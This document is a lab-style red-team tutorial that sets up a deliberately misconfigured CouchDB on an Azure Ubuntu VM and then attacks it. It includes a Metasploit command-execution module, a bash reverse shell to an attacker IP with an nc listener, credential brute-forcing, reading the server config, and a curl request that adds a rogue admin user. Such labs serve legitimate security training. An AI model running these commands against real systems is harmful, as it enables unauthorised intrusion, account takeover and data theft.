## **CouchDB on Azure Ubuntu VM**

This guide walks through configuring and attacking **CouchDB on Ubuntu**
— both hosted in **Azure VMs** — with the goal of practicing
enumeration, exploitation, and post-exploitation tactics using tools
like **Metasploit**.

**Goal;** Install **Apache CouchDB** on an Ubuntu 20.04 Azure VM,
misconfigure it to allow remote access, and use **Metasploit** for RCE.

###  Step-by-Step: Install & Configure CouchDB

1.  **Deploy Ubuntu VM on Azure**

    - Size: Standard_B2s or higher

    - Allow ports: 22, 5984 in NSG

    - Assign Public IP

2.  **Update System and Install Prereqs**

3.  sudo apt update

4.  sudo apt install -y apache2 apt-transport-https gnupg
    ca-certificates curl

5.  **Add CouchDB GPG Key and Repo**

6.  curl https://couchdb.apache.org/repo/bintray-pubkey.asc \| sudo
    apt-key add -

7.  echo "deb https://apache.bintray.com/couchdb-deb focal main" \| sudo
    tee -a /etc/apt/sources.list

8.  sudo apt update

9.  sudo apt install -y couchdb

10. **Setup During Installation**

    - Select **Standalone**

    - Enter server’s **public IP** to bind CouchDB

    - Set **admin credentials**

11. **Start & Enable CouchDB**

12. sudo systemctl start couchdb

13. sudo systemctl enable couchdb

14. sudo systemctl status couchdb

15. **Access CouchDB Admin Panel**

16. http://\<server-ip\>:5984/\_utils/

17. **Verify CouchDB is Externally Accessible**

18. nmap -sV -p5984 \<target-ip\>

19. curl http://\<server-ip\>:5984/

### Exploitation: CouchDB RCE via Metasploit

1.  **Use Metasploit Exploit Module**

2.  msfconsole

3.  use exploit/multi/http/couchdb_cmd_exec

4.  set RHOSTS \<target-ip\>

5.  set RPORT 5984

6.  set USERNAME ignite

7.  set PASSWORD 123

8.  set CMD whoami

9.  exploit

10. **If RCE is Confirmed, Upgrade to Reverse Shell**

    - Use payload:

    - set CMD "bash -i \>& /dev/tcp/\<attacker-ip\>/4444 0\>&1"

11. **Verify Shell Access**

    - Start listener on Kali:

    - nc -lvnp 4444

12. **Post-Exploitation**

    - Enumerate databases: curl http://\<ip\>:5984/\_all_dbs

    - Read config: curl http://\<ip\>:5984/\_node/\_local/\_config

    - Upload web shells or pivot internally

**🔁 Summary of Azure Pentest Opportunities**

| **Target** | **Attack Vector** | **Toolset** | **Impact** |
|----|----|----|----|
| MSSQL | Weak creds, open port 1433 | Metasploit | RCE, lateral movement |
| CouchDB | Misconfigured bind IP + weak auth | Metasploit, curl | RCE, data exfiltration, pivot |

**🎯 Recommendations for Azure Red Teams**

- Always **test access from outside** to validate exposure (NSG + app
  config)

- Simulate **realistic misconfigurations** (e.g., weak SQL creds, public
  DBs)

- Leverage **Metasploit + manual curl** for proof-of-concept and
  weaponization

- Automate recon via **Nmap**, **EyeWitness**, and **custom scripts**

## **Part 1: Attacking CouchDB on Azure VM**

This guide simulates a misconfigured database deployment inside **Azure
Virtual Machines (VMs)**, commonly exposed due to poor configuration or
default settings. We'll explore vulnerabilities in **CouchDB**, using
tools like nmap, Metasploit, and curl to demonstrate enumeration,
brute-force, and remote exploitation.

**Goal**

Identify an exposed CouchDB service (port 5984), brute-force
credentials, access the DB, escalate privileges, and potentially gain
RCE or sensitive data access.

**☁️ Scenario Setup**

**✅ Azure Environment (Common for CouchDB)**

- **Target VMs**:

  - OS: Ubuntu 20.04 LTS

  - NSG Rules:

    - CouchDB: Port **5984** open

- **Attacker VM**:

  - OS: Kali Linux (or Parrot OS)

  - Tools: nmap, msfconsole, curl, hydra

**Step 1: Enumeration via Nmap**

nmap -p5984 \<target-ip\>

Check if CouchDB is exposed externally.

nmap -sV --script couchdb-databases,couchdb-stats -p5984 \<target-ip\>

📌 Scripts like couchdb-databases enumerate available databases and
stats; great for identifying potential targets.

**💣 Step 2: Brute-Force Credentials with Metasploit**

msfconsole

use auxiliary/scanner/couchdb/couchdb_login

set RHOSTS \<target-ip\>

set USER_FILE /root/user.txt

set PASS_FILE /root/pass.txt

run

🔐 If successful, you'll receive CouchDB credentials such as ignite:123.

**📥 Step 3: Access CouchDB via Curl**

curl -u ignite:123 -X GET http://\<target-ip\>:5984/\_all_dbs

This retrieves a list of all databases.

**🛠️ Step 4: Add Admin User via Curl**

curl -u ignite:123 -X PUT
http://\<target-ip\>:5984/\_users/org.couchdb.user:aarti \\

-H "Content-Type: application/json" \\

-d
'{"type":"user","name":"aarti","roles":\["\_admin"\],"password":"123"}'

✅ You now have admin access to the database and can manage users,
modify config, or deploy malicious payloads.

**🔁 Optional: Use Other Metasploit Exploits**

search couchdb

You can further exploit CouchDB with other modules such as:

- exploit/multi/http/couchdb_cmd_exec
